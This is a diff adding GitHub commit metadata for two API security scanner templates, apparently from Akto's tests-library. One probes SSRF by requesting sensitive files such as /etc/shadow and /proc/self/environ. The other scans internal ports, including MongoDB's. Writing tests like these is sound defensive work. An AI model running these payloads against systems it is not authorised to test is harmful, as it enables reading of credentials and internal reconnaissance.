@@ -1,0 +1,26 @@
+[
+  {
+    "sha": "5800d0f4e3c125b1a8a71480ccf0dc7e5f32b8c6",
+    "filename": "SSRF/business-logic/fetch_sensitive_files.yaml",
+    "status": "added",
+    "additions": 33,
+    "deletions": 0,
+    "changes": 33,
+    "blob_url": "https://github.com/akto-api-security/tests-library/blob/ec759de9035cc935c152de7393c2e3532c21481e/SSRF%2Fbusiness-logic%2Ffetch_sensitive_files.yaml",
+    "raw_url": "https://github.com/akto-api-security/tests-library/raw/ec759de9035cc935c152de7393c2e3532c21481e/SSRF%2Fbusiness-logic%2Ffetch_sensitive_files.yaml",
+    "contents_url": "https://api.github.com/repos/akto-api-security/tests-library/contents/SSRF%2Fbusiness-logic%2Ffetch_sensitive_files.yaml?ref=ec759de9035cc935c152de7393c2e3532c21481e",
+    "patch": "@@ -0,0 +1,33 @@\n+id: fetch_sensitive_files\n+info:\n+  name: Fetch sensitive files via SSRF\n+  author: akto\n+  severity: high\n+\n+requests:\n+  - method: \"{{Method}}\"\n+    path:\n+      - \"{{BaseURL}}\"\n+    body: \"{{Body}}\"\n+\n+    payloads:\n+      filename:\n+        - \"/etc/passwd\"\n+        - \"/etc/lsb-release\" \n+        - \"/etc/shadow\" \n+        - \"/etc/hosts\" \n+        - \"/proc/self/environ\"\n+        - \"/proc/self/cmdline\"\n+        - \"/proc/self/cwd/index.php\"\n+        - \"/proc/self/cwd/application.py\" \n+        - \"/proc/self/cwd/main.py\"\n+        - \"/proc/self/exe\"\n+    \n+    attack: clusterbomb\n+      \n+    stop-at-first-match: false\n+\n+    matchers:\n+      - type: status\n+        status:\n+          - 200\n\\ No newline at end of file"
+  },
+  {
+    "sha": "8a18430602d8ee42eb1052692c575569fafdda22",
+    "filename": "SSRF/business-logic/port_scanning.yaml",
+    "status": "added",
+    "additions": 29,
+    "deletions": 0,
+    "changes": 29,
+    "blob_url": "https://github.com/akto-api-security/tests-library/blob/ec759de9035cc935c152de7393c2e3532c21481e/SSRF%2Fbusiness-logic%2Fport_scanning.yaml",
+    "raw_url": "https://github.com/akto-api-security/tests-library/raw/ec759de9035cc935c152de7393c2e3532c21481e/SSRF%2Fbusiness-logic%2Fport_scanning.yaml",
+    "contents_url": "https://api.github.com/repos/akto-api-security/tests-library/contents/SSRF%2Fbusiness-logic%2Fport_scanning.yaml?ref=ec759de9035cc935c152de7393c2e3532c21481e",
+    "patch": "@@ -0,0 +1,29 @@\n+id: port_scanning\n+info:\n+  name: Scan ports\n+  author: akto\n+  severity: high\n+\n+requests:\n+  - method: \"{{Method}}\"\n+    path:\n+      - \"{{BaseURL}}\"\n+    body: \"{{Body}}\"\n+\n+    payloads:\n+      port:\n+        - \"22\"\n+        - \"80\"\n+        - \"443\"\n+        - \"8080\"\n+        - \"27017\"\n+\n+    matchers:\n+      - type: regex\n+        part: body\n+        regex:\n+          - '(?i)rejected'\n+          - '(?i)refused'\n+          - '(?i)timeout'\n+          - 'MongoDB'\n+        condition: or\n\\ No newline at end of file"
+  }
+]
